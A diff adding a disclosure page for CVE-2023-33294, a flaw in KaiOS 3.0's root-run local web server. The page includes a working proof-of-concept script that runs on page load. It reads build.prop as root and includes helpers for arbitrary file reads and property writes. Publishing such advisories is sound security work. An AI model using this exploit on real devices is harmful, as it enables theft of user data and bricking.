@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>CVE-2023-33294: KaiOS 3.0 Root CLI via TCT Web Server</title>
+    <style type="text/css">
+        body {
+            font-family: PT Sans,sans-serif;
+        }
+
+        p {
+            font-size: 1.1rem;
+            line-height: 1.85;
+        }
+
+        code {
+            font-size: 1rem;
+        }
+
+        button {
+            display: block;
+        }
+
+        button + button {
+            margin-top: 0.5rem;
+        }
+
+        summary {
+            display: block;
+            max-width: 400px;
+            background-color: #f5f5f5;
+            padding: 1rem;
+        }
+
+        code.block {
+            display: block;
+            white-space: pre;
+        }
+
+        #result {
+            display: block;
+            white-space: pre-wrap;
+        }
+    </style>
+  </head>
+  <body>
+    <h1>CVE-2023-33294: Execute Commands as Root from KaiOS 3.0 Browser via TCT Web Server</h1>
+    <summary>
+        <p>
+            Vendor: KaiOS Technologies Inc.<br />
+            Vendor URL: <a href="https://www.kaiostech.com/" rel="external noopener" referrerpolicy="strict-origin-when-cross-origin">https://www.kaiostech.com/</a><br />
+            Versions affected: KaiOS 3.0<br />
+            Systems Affected: KaiOS-based mobile devices<br />
+            Author: <a href="https://barrasso.me" rel="external noopener" referrerpolicy="strict-origin-when-cross-origin">Tom Barrasso</a><br />
+            CVE Identifier: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33294">CVE-2023-33294</a><br />
+            Risk: Critical
+        </p>
+    </summary>
+    <h3>Summary</h3>
+    <p>
+        KaiOS is a mobile operating system based on Firefox OS. KaiOS 3.0 comes shipped with a binary, <code>tctweb_server</code>, exposing a local web server that responds to HTTP requests on port 2929.
+        This server responds to GET and POST requests, accepting a <code>application/x-www-form-urlencoded</code> formatted request body with key-value tuples separated by '&', with a '='.<br />
+        <code>tctweb_server</code> runs as root. It supports pre-defined commands for getting & setting system properties, reading & writing NV items, and reading files. It also allows for execution of user-provided bash commands.
+        Because the server is exposed on <code>http://127.0.0.1:2929</code>, and it returns the header <code>Access-Control-Allow-Origin: *</code> with every request, it is accessible to all installed apps and websites the system browser.
+    </p>
+    <h3>Location</h3>
+    <ul>
+        <li>Source: <code>/system/bin/tctweb_server</code></li>
+    </ul>
+    <h3>Impact</h3>
+    <p>
+        Because <code>tctweb_server</code> runs as root, accepts arbitrary bash commands, and is accessible via the system browser, it has a very high potential for abuse.
+        This risk is partially mitigated by SELinux enforcement. As a result, <code>tctweb_server</code> cannot be used to read, write, or modify files or permissions within protected partitions.<br />
+        The following are examples of what can be accomplished simply by visiting a malicious website on a KaiOS 3.0 device.
+        <ul>
+            <li>Using <code>cmdshell=readfile</code> to get the list of installed applications (<code>system/b2g/webapps/webapps.json</code>), or user profile data including notifications and downloads (folder: <code>data/b2g/mozilla/*.default/</code>, files: <code>downloads.json</code>, <code>notifications.json</code>)</li>
+            <li>Modifying or deleting local files, i.e. in <code>sdcard/</code></li>
+            <li>Bricking the device by enabling the kill switch system property <code>persist.moz.killswitch</code></li>
+        </ul>
+    </p>
+    <p>
+        An attacker can make <code>XMLHttpRequest</code> or <code>fetch</code> requests to <code>http://127.0.0.1:2929</code> with parameters to run commands as root.
+        In this simple example, the contents of the <code>build.prop</code> file are displayed on screen.
+        <code class="block">
+            let xhr = new XMLHttpRequest();
+            xhr.open('POST', 'http://127.0.0.1:2929', true);
+            xhr.send('cmd=bash&cmdshell=readfile&filename=system/build.prop');
+        </code>
+        <br />
+        <a href="/img/CVE-KaiOS-TCT-Web-Server.jpg" title="Photo of build.prop file displayed on Alcatel Go Flip 4 (KaiOS 3.0) browser">
+            <img src="/img/CVE-KaiOS-TCT-Web-Server.jpg" alt="Photo of build.prop file displayed on Alcatel Go Flip 4 (KaiOS 3.0) browser" height="600" loading="lazy" decoding="async" />
+        </a>
+    </p>
+    <h3>Recommendation</h3>
+    <p>
+        Given the strong potential for abuse, the <code>tctweb_server</code> binary should either be permission-restricted to only certified apps or removed altogether. Analysis of builds from the Nokia 2780 Flip suggests that <code>tctweb_server</code> was removed in KaiOS 3.1.
+    </p>
+    <h2>Demo</h2>
+    <p>This demo displays the contents of <code>build.prop</code> on screen.</p>
+    <section id="details">
+      <p>
+        <span><b>KaiOS Version</b>:</span>
+        <span id="version"></span>
+      </p>
+      <p>
+        <span><b>build.prop</b></span><br />
+        <span id="result"></span>
+      </p>
+    </section>
+    <h3>Vendor Communication Timeline</h3>
+    <ul>
+        <li>5/2/23: Tom emailed security@kaiostech.com asking for PGP key used for secure communication.</li>
+        <li>5/5/23: Tom disclosed issues to KaiOS Technologies.</li>
+        <li>5/8/23: KaiOS Technologies acknowledged this issue.</li>
+        <li>5/15/23: Tom asked for the current remediation status.</li>
+    </ul>
+
+	<script type="text/javascript">
+        (function() {
+            let result = document.getElementById('result');
+            let version = document.getElementById('version');
+
+            // Display version
+            let verFrag = navigator.userAgent.toUpperCase().split('KAIOS')[1];
+            verFrag = (((verFrag || '').split(' ')[0] || '').split('/')[1] || '');
+            version.innerText = verFrag || 'N/A';
+
+            const engmodeURL = "http://127.0.0.1:2929";
+
+            class RemoteDebugger {
+                constructor() {
+                }
+
+                readFile(name) {
+                    let url = new URL(engmodeURL);
+                    url.searchParams.append('cmd', 'bash');
+                    url.searchParams.append('cmdshell', 'cat ' + name);
+                    url.searchParams.append('cmd', 'bash');
+
+                    return this.runXHRequest(url);
+                }
+
+                getproperty(key) {
+                    let url = new URL(engmodeURL);
+                    url.searchParams.append('cmd', 'bash');
+                    url.searchParams.append('cmdshell', 'get_sys_property');
+                    url.searchParams.append('key', key);
+
+                    return this.runXHRequest(url);
+                }
+
+                setproperty(key, value) {
+                    let url = new URL(engmodeURL);
+                    url.searchParams.append('cmd', 'bash');
+                    url.searchParams.append('cmdshell', 'set_sys_property');
+                    url.searchParams.append('key', key);
+                    url.searchParams.append('data', value);
+
+                    return this.runXHRequest(url);
+                }
+
+                readFileCommand(path) {
+                    let url = new URL(engmodeURL);
+                    url.searchParams.append('cmd', 'bash');
+                    url.searchParams.append('cmdshell', 'readfile');
+                    url.searchParams.append('filename', path);
+
+                    return this.runXHRequest(url);
+                }
+
+                runXHRequest(url) {
+                    let xhr = new XMLHttpRequest();
+                    xhr.open("POST", engmodeURL, true);
+
+                    return new Promise(function(resolve, reject) {
+                        xhr.onload = function() {
+                            resolve(xhr.response);
+                        };
+                        xhr.onerror = function(e) {
+                            reject(e);
+                        };
+                        xhr.send(url.search.substring(1));
+                    });
+                }
+            }
+
+            let remoteDebugger = new RemoteDebugger();
+
+            function readBuildProp() {
+                return remoteDebugger.readFileCommand('system/build.prop')
+                    .then((response) => {
+                        let responsePretty = response.split('"value":"')[1].trim().replace('"}', '').replace(/\s/, '<br />')
+                        result.innerHTML = responsePretty;
+                    })
+                    .catch((e) => {
+                        console.warn(e);
+                    });
+            }
+
+            requestAnimationFrame(readBuildProp);
+        })();
+    </script>
+  </body>
+</html>
